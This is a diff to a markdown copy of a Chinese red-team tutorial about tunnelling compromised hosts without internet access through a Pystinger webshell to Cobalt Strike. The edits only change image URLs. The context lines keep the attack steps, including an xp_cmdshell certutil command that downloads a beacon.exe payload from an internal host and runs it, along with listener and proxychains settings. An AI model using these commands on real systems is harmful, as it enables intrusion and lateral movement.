@@ -55,7 +55,7 @@ http上线不出网主机](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=
  **0x02 Pystinger简单介绍**
 
 Pystinger由服务端`webshell`、`stinger_server`和客户端`stinger_client`两部分组成，可通过webshell实现内网SOCK4代理及端口映射，支持php/jsp(x)/aspx三种代理脚本。  
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123223.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123223.png)
 
   
 
@@ -65,7 +65,7 @@ webshell只负责流量转发，大部分建立连接及处理数据的工作由
 
 大致原理如下图，更为详细的原理分析可阅读“奇安信安全服务”公众号中的“[红队攻防实践：不出网主机搭建内网隧道新思路](http://mp.weixin.qq.com/s?__biz=MzI4MzA0ODUwNw==&mid=2247484958&idx=1&sn=a6fcfa2f4b7c5e1d0b3d3a368b4c92ef&chksm=eb91e94adce6605cbd9f2716d69d11b805448edb215ecff160003ea4b87f5749862c6db58491&scene=21#wechat_redirect)”一文进行学习了解。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123224.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123224.png)
 
   
 
@@ -79,7 +79,7 @@ webshell只负责流量转发，大部分建立连接及处理数据的工作由
     
     start C:\inetpub\wwwroot\stinger_server.exe 0.0.0.0
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123225.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123225.png)  
 
   
 
@@ -103,14 +103,14 @@ w参数替换为自己上传的代理脚本地址即可。
 已控主机为单主机，不出外网且仅允许访问目标Web的80端口。如遇这种场景时可在执行完以上操作后在CobaltStrike创建一个Listener，HTTP
 Hosts填`127.0.0.1`，HTTP Port填`60020`。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123226.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123226.png)  
 
  **场景2：多主机上线**
 
 已控主机为内网其中一台主机，双网卡（192.168.56.X为出网段，192.168.186.X为不出网段），在对不出网段中的其他内网主机进行横向移动上线时可在执行完以上操作后在CobaltStrike创建一个Listener，HTTP
 Hosts填`192.168.186.3`，HTTP Port填`60020`。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123227.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123227.png)
 
   
 
@@ -122,7 +122,7 @@ Hosts填`192.168.186.3`，HTTP Port填`60020`。
     
     EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.168.186.3/beacon.exe C:\ProgramData\beacon.exe'EXEC master..xp_cmdshell 'C:\ProgramData\beacon.exe'
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123228.png)![]()  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123228.png)![]()  
 
  **CobaltStrike监听设置**
 
@@ -168,7 +168,7 @@ Kali攻击机上编辑/etc/proxychains.conf文件，底部添加一条socks4代�
   
   
   
-[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123229.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123230.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)[![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123231.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)
+[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123229.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123230.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)[![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210826123231.png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)
 
 * * *
 
